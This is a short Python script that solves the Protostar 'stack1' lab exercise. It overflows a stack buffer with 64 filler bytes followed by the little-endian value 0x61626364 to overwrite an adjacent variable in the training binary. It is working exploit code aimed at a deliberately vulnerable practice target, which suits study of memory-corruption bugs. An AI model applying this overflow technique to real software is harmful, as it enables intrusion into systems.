#!/usr/bin/python
# Goal is abcd, or 0x61626364

import commands

# Create a buffer with 64 A's and then our target value
buffer = 'A'*64 + '\x64\x63\x62\x61'

# Path to binary
command = '/opt/protostar/bin/stack1'

# String to execute command with buffer as argument
line = command + " " + buffer

# Run command and print output
output = commands.getoutput(line)
print(output)
